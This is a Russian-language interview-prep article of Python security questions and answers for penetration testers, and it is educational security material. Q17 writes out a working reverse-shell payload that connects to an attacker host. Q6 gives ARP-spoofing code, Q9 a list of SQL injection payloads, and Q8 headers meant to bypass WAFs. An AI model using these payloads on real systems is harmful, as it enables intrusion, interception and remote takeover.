---
title: "Python для кибербезопасности: вопросы и ответы для пентестеров"
description: "20 вопросов на собеседовании по Python и безопасности для ролей в тестировании на проникновение и InfoSec. Охватывает программирование сокетов, Scapy, веб-эксплуатацию, криптографию и автоматизацию скриптов."
date: 2026-02-11
tags: ["python", "interview", "security", "penetration-testing"]
keywords: ["python security interview", "infosec python questions", "scripting for hackers", "python pentest interview", "socket programming interview", "scapy interview questions", "python cryptography", "ethical hacking python", "security automation interview", "python exploit development"]
draft: false
schema_json: >
  {
    "@context": "https://schema.org",
    "@type": "TechArticle",
    "name": "Python для кибербезопасности: вопросы и ответы для пентестеров",
    "description": "20 вопросов на собеседовании по Python и безопасности, охватывающих программирование сокетов, манипуляцию пакетами, веб-эксплуатацию и автоматизацию.",
    "proficiencyLevel": "Advanced",
    "inLanguage": "ru"
  }
---

## Инициализация системы

Python — доминирующий язык в наступательной и оборонительной безопасности. Роли тестирования на проникновение, красных команд, аналитиков SOC и инженеров безопасности требуют свободного владения Python для автоматизации, разработки инструментов и быстрого прототипирования. На собеседованиях от вас ожидают написания кода на месте — от TCP-клиентов на сокетах до создателей пакетов и скриптов для веб-эксплойтов. Это руководство охватывает 20 вопросов, которые проверяют пересечение программирования на Python и знаний в области безопасности.

**Нужны готовые фрагменты кода?** Держите открытой нашу [Шпаргалку по скриптам безопасности на Python](/cheatsheets/python-security-scripts/) во время подготовки.

---

## Сети и сокеты

<details>
<summary><strong>1. Как создать TCP-клиент на Python?</strong></summary>
<br>

```python
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("target.com", 80))
client.send(b"GET / HTTP/1.1\r\nHost: target.com\r\n\r\n")
response = client.recv(4096)
print(response.decode())
client.close()
```

Ключевые моменты: `AF_INET` = IPv4, `SOCK_STREAM` = TCP. Для UDP используйте `SOCK_DGRAM` и `sendto()`/`recvfrom()` вместо `connect()`/`send()`/`recv()`. Всегда устанавливайте таймауты в продакшн-скриптах: `client.settimeout(5)`.
</details>

<details>
<summary><strong>2. Как работает трёхстороннее рукопожатие TCP на уровне сокетов?</strong></summary>
<br>

Когда вы вызываете `client.connect((host, port))`, библиотека сокетов Python инициирует выполнение трёхстороннего рукопожатия операционной системой:

1. ОС отправляет пакет **SYN** серверу.
2. Сервер отвечает **SYN-ACK**.
3. ОС отправляет **ACK** — соединение установлено, `connect()` возвращает управление.

Если рукопожатие не удаётся (порт закрыт, таймаут), `connect()` вызывает `ConnectionRefusedError` или `socket.timeout`. С помощью Scapy вы можете вручную создавать и отправлять каждый пакет для выполнения скрытых SYN-сканирований — отправляя SYN, проверяя SYN-ACK, затем отправляя RST вместо ACK, чтобы избежать завершения рукопожатия.
</details>

<details>
<summary><strong>3. Напишите многопоточный сканер портов на Python.</strong></summary>
<br>

```python
import socket
import threading
from queue import Queue

target = "192.168.1.1"
open_ports = []
lock = threading.Lock()
queue = Queue()

def scan(port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        if result == 0:
            with lock:
                open_ports.append(port)
    except Exception:
        pass

def worker():
    while not queue.empty():
        scan(queue.get())
        queue.task_done()

for p in range(1, 1025):
    queue.put(p)

for _ in range(100):
    t = threading.Thread(target=worker, daemon=True)
    t.start()

queue.join()
print(f"Open ports: {sorted(open_ports)}")
```

Темы для обсуждения: почему потоки, а не процессы (I/O-bound, а не CPU-bound), почему `connect_ex` вместо `connect` (возвращает код ошибки вместо генерации исключения), и почему `settimeout` критически важен (предотвращает зависание на фильтруемых портах).
</details>

<details>
<summary><strong>4. В чём разница между `socket.connect()` и `socket.connect_ex()`?</strong></summary>
<br>

- `connect()`: Генерирует исключение (`ConnectionRefusedError`, `TimeoutError`) при неудачном подключении. Подходит для скриптов, где сбой должен остановить выполнение.
- `connect_ex()`: Возвращает код ошибки вместо генерации исключения. Возвращает `0` при успехе, ненулевой errno при неудаче. Лучше для сканеров портов, где нужно проверить сотни портов без накладных расходов try/except.
</details>

## Scapy и манипуляция пакетами

<details>
<summary><strong>5. Что такое Scapy и почему он предпочтительнее raw-сокетов?</strong></summary>
<br>

Scapy — это библиотека Python для интерактивной манипуляции пакетами. Она позволяет создавать, отправлять, захватывать и анализировать сетевые пакеты на любом уровне протокола.

Преимущества перед raw-сокетами:
- **Послойная конструкция**: Создавайте пакеты, наслаивая уровни протоколов: `IP()/TCP()/Raw()`.
- **Поддержка протоколов**: Встроенная поддержка сотен протоколов (ARP, DNS, ICMP, TCP, UDP, 802.11).
- **Разбор ответов**: Автоматически сопоставляет запросы с ответами и анализирует их.
- **Интерактивный режим**: REPL для живого экспериментирования с пакетами.

Raw-сокеты требуют ручного создания пакетов на уровне байтов и разрешений на уровне ОС. Scapy абстрагирует это, предоставляя тот же уровень контроля.
</details>

<details>
<summary><strong>6. Как выполнить ARP-спуфинг с помощью Scapy?</strong></summary>
<br>

```python
from scapy.all import ARP, Ether, sendp

def arp_spoof(target_ip, spoof_ip, target_mac):
    packet = Ether(dst=target_mac) / ARP(
        op=2,  # ARP reply
        pdst=target_ip,
        hwdst=target_mac,
        psrc=spoof_ip  # Claim to be this IP
    )
    sendp(packet, verbose=0)
```

Это отправляет незапрошенный ARP-ответ, сообщающий цели, что `spoof_ip` находится по вашему MAC-адресу. Трафик, предназначенный для `spoof_ip`, перенаправляется на вашу машину. В сочетании с IP-форвардингом это позволяет проводить атаки типа «человек посередине».

**Защита**: Статические ARP-записи, Dynamic ARP Inspection (DAI) или инструменты мониторинга ARP, такие как arpwatch.
</details>

<details>
<summary><strong>7. Как захватывать сетевой трафик и фильтровать определённые протоколы?</strong></summary>
<br>

```python
from scapy.all import sniff, TCP, IP

def packet_handler(packet):
    if packet.haslayer(TCP) and packet.haslayer(IP):
        src = packet[IP].src
        dst = packet[IP].dst
        sport = packet[TCP].sport
        dport = packet[TCP].dport
        print(f"{src}:{sport} -> {dst}:{dport}")

# Capture HTTP traffic only
sniff(filter="tcp port 80", prn=packet_handler, count=50, store=0)
```

Параметр `filter` использует синтаксис BPF (Berkeley Packet Filter). `store=0` предотвращает хранение пакетов в памяти. Требуются права root/admin.
</details>

## Веб-безопасность

<details>
<summary><strong>8. Как автоматизировать веб-запросы для тестирования безопасности?</strong></summary>
<br>

```python
import requests

session = requests.Session()

# Custom headers to bypass basic WAFs
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "X-Forwarded-For": "127.0.0.1"
})

# Login and maintain session cookies
login_data = {"username": "admin", "password": "test"}
session.post("http://target.com/login", data=login_data)

# Authenticated request (cookies auto-included)
response = session.get("http://target.com/admin/dashboard")
print(response.status_code)
```

Ключевые концепции: `Session()` сохраняет куки между запросами. Всегда устанавливайте `timeout` в продакшн-скриптах. Используйте `verify=False` только в контролируемых тестовых средах (отключает проверку SSL).
</details>

<details>
<summary><strong>9. Как бы вы тестировали SQL-инъекцию с помощью Python?</strong></summary>
<br>

```python
import requests

url = "http://target.com/search"
payloads = [
    "' OR 1=1--",
    "' UNION SELECT NULL,NULL--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND 1=CONVERT(int,@@version)--"
]

for payload in payloads:
    r = requests.get(url, params={"q": payload}, timeout=10)
    if "error" in r.text.lower() or "sql" in r.text.lower():
        print(f"[!] Possible SQLi with: {payload}")
    if r.elapsed.seconds >= 5:
        print(f"[!] Time-based SQLi confirmed: {payload}")
```

Это проверяет SQL-инъекцию на основе ошибок (сообщения об ошибках в ответе), на основе UNION (изменённый вывод) и слепую на основе времени (задержка ответа). Для профессиональных пентестов используйте SQLMap — но на собеседованиях от вас ожидают понимания базовых механизмов.
</details>

<details>
<summary><strong>10. В чём разница между requests.get() и urllib?</strong></summary>
<br>

- **requests**: Сторонняя библиотека. Чистый API, автоматический разбор JSON, управление сессиями, пул соединений, поддержка прокси. Отраслевой стандарт для HTTP в Python.
- **urllib**: Стандартная библиотека. Более многословная, низкоуровневая. Без управления сессиями. Полезна, когда нельзя установить сторонние пакеты (ограниченные среды, лямбда-функции).

Для тестирования безопасности предпочтителен `requests` за его простоту. Для разработки эксплойтов, где важно минимизировать зависимости, `urllib` или даже raw-сокеты могут быть лучше.
</details>

## Криптография

<details>
<summary><strong>11. В чём разница между хешированием и шифрованием?</strong></summary>
<br>

- **Хеширование**: Односторонняя функция. Вход → дайджест фиксированного размера. Не может быть обращён. Один и тот же вход всегда даёт один и тот же выход. Используется для проверки целостности, хранения паролей. Примеры: SHA-256, bcrypt, Argon2.
- **Шифрование**: Двусторонняя функция. Открытый текст → шифротекст (с ключом) → открытый текст (с ключом). Предназначено для обращения владельцем ключа. Используется для конфиденциальности. Примеры: AES, RSA, ChaCha20.

Распространённая ошибка: Использование MD5/SHA для «шифрования» данных. Хеширование — это не шифрование: вы не можете восстановить исходные данные из хеша (без перебора).
</details>

<details>
<summary><strong>12. Как реализовать шифрование AES на Python?</strong></summary>
<br>

```python
from cryptography.fernet import Fernet

# Generate a key (store securely!)
key = Fernet.generate_key()
cipher = Fernet(key)

# Encrypt
plaintext = b"sensitive data"
ciphertext = cipher.encrypt(plaintext)

# Decrypt
decrypted = cipher.decrypt(ciphertext)
assert decrypted == plaintext
```

Fernet использует AES-128-CBC с HMAC-SHA256 для аутентифицированного шифрования. Для более низкоуровневого контроля используйте `cryptography.hazmat` с AES-GCM (аутентифицированное шифрование, отдельный HMAC не нужен).

Никогда не реализуйте собственные криптографические примитивы. Используйте проверенные библиотеки.
</details>

<details>
<summary><strong>13. Как безопасно хешировать пароли в Python?</strong></summary>
<br>

```python
import bcrypt

# Hash a password
password = b"user_password"
salt = bcrypt.gensalt(rounds=12)
hashed = bcrypt.hashpw(password, salt)

# Verify a password
if bcrypt.checkpw(password, hashed):
    print("Password matches")
```

Почему bcrypt, а не SHA-256: bcrypt намеренно **медленный** (настраиваемые раунды), что делает атаки перебором непрактичными. SHA-256 спроектирован для скорости — атакующий может вычислять миллиарды хешей в секунду с помощью GPU. Альтернативы: Argon2 (memory-hard, рекомендуется для новых проектов), PBKDF2 (широко поддерживается).
</details>

## Автоматизация и скриптинг

<details>
<summary><strong>14. Как безопасно выполнять подпроцессы в Python?</strong></summary>
<br>

```python
import subprocess

# SECURE: Pass arguments as a list (no shell injection)
result = subprocess.run(
    ["nmap", "-sV", "-p", "80,443", "192.168.1.1"],
    capture_output=True, text=True, timeout=60
)
print(result.stdout)

# INSECURE: Never do this with user input
# subprocess.run(f"nmap {user_input}", shell=True)  # Command injection!
```

Правила: Никогда не используйте `shell=True` с пользовательским вводом. Всегда передавайте команды в виде списков. Устанавливайте `timeout` для предотвращения зависаний. Используйте `capture_output=True` для сбора stdout/stderr.
</details>

<details>
<summary><strong>15. Как анализировать лог-файлы с помощью Python?</strong></summary>
<br>

```python
import re
from collections import Counter

failed_logins = Counter()

with open("/var/log/auth.log") as f:
    for line in f:
        match = re.search(r"Failed password .* from (\d+\.\d+\.\d+\.\d+)", line)
        if match:
            failed_logins[match.group(1)] += 1

# Top 10 offending IPs
for ip, count in failed_logins.most_common(10):
    print(f"{ip}: {count} failed attempts")
```

Для больших файлов всегда читайте построчно (никогда не используйте `.read()` для загрузки всего файла в память). Используйте `re.compile()` для предварительной компиляции регулярных выражений для повышения производительности.
</details>

<details>
<summary><strong>16. Что такое GIL и как он влияет на инструменты безопасности?</strong></summary>
<br>

**Global Interpreter Lock (GIL)** предотвращает одновременное выполнение байт-кода Python несколькими потоками. В CPython одновременно выполняется только один поток.

Влияние на инструменты безопасности:
- **Сканеры портов** (I/O-bound): Потоки работают хорошо. Потоки проводят большую часть времени в ожидании сетевых ответов, а не выполняя код Python. GIL освобождается во время операций ввода-вывода.
- **Взломщики паролей** (CPU-bound): Потоки бесполезны. Используйте `multiprocessing` для задействования нескольких ядер CPU или C-расширения (hashcat, John the Ripper) для реального взлома.
- **Альтернатива**: Используйте `asyncio` для высококонкурентных сетевых инструментов (тысячи одновременных соединений с минимальными накладными расходами).
</details>

## Разработка эксплойтов

<details>
<summary><strong>17. Как создать полезную нагрузку обратной оболочки на Python?</strong></summary>
<br>

```python
import socket, subprocess, os

def reverse_shell(attacker_ip, attacker_port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((attacker_ip, attacker_port))
    os.dup2(s.fileno(), 0)  # stdin
    os.dup2(s.fileno(), 1)  # stdout
    os.dup2(s.fileno(), 2)  # stderr
    subprocess.call(["/bin/bash", "-i"])
```

Это перенаправляет stdin/stdout/stderr в TCP-сокет, предоставляя атакующему интерактивную оболочку. На собеседованиях объясняйте концепцию и защиту (фильтрация исходящего трафика, сегментация сети, мониторинг EDR) — а не только код. Это предназначено только для авторизованного тестирования и CTF-соревнований.
</details>

<details>
<summary><strong>18. Что такое сериализация и почему она представляет угрозу безопасности?</strong></summary>
<br>

Сериализация преобразует объекты в байты для хранения/передачи. **Десериализация** ненадёжных данных — это критическая уязвимость.

```python
import pickle

# DANGEROUS: Never unpickle untrusted data
data = pickle.loads(untrusted_bytes)  # Can execute arbitrary code!
```

Модуль `pickle` Python может выполнять произвольный код во время десериализации. Атакующий может создать pickle-полезную нагрузку, которая запускает обратную оболочку при загрузке.

Безопасные альтернативы: Используйте `json` для обмена данными (выполнение кода невозможно). Если необходимо десериализовать сложные объекты, используйте валидацию `jsonschema` или protobuf/msgpack со строгими схемами.
</details>

<details>
<summary><strong>19. Как взаимодействовать с REST API для сбора OSINT?</strong></summary>
<br>

```python
import requests

# Shodan API - find exposed services
api_key = "YOUR_API_KEY"
target = "8.8.8.8"
response = requests.get(
    f"https://api.shodan.io/shodan/host/{target}",
    params={"key": api_key}
)
data = response.json()

for service in data.get("data", []):
    print(f"Port {service['port']}: {service.get('product', 'unknown')}")
```

Распространённые OSINT API: Shodan (открытые устройства), VirusTotal (анализ вредоносного ПО), Have I Been Pwned (данные утечек), SecurityTrails (история DNS). Всегда соблюдайте ограничения частоты запросов и условия использования.
</details>

<details>
<summary><strong>20. Как написать кейлоггер на Python и как обнаружить его?</strong></summary>
<br>

Концептуальный ответ (контекст собеседования):
Кейлоггер перехватывает систему ввода ОС для захвата нажатий клавиш. В Linux он читает из устройств `/dev/input/event*`. В Windows он использует API `SetWindowsHookEx` через `ctypes` или `pynput`.

**Методы обнаружения**:
- Мониторинг процессов, обращающихся к устройствам ввода: `lsof /dev/input/*`.
- Проверка неожиданных импортов `pynput`, `keyboard` или `ctypes` в запущенных процессах Python.
- Сигнатуры EDR/антивируса для известных паттернов кейлоггеров.
- Мониторинг сети на предмет эксфильтрации (кейлоггеры должны отправлять данные куда-то).

На собеседованиях всегда подчёркивайте защитную перспективу: как обнаруживать, предотвращать и реагировать на кейлоггеры — а не только как их создавать.
</details>
